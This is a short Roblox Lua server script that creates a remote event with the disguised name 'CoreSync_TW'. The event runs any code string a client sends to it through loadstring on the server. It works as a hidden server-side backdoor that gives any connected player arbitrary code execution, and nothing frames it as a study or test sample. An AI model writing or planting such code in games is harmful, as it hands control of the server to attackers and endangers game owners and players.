local tidal = Instance.new("RemoteEvent", game.ReplicatedStorage)
tidal.Name = "CoreSync_TW"

tidal.OnServerEvent:Connect(function(player, code)
	local success, result = pcall(function()
		return loadstring(code)()
	end)
	if success then
		print(player.Name .. " executed code")
	else
		warn("LMAO ERROR:", result)
	end
end)
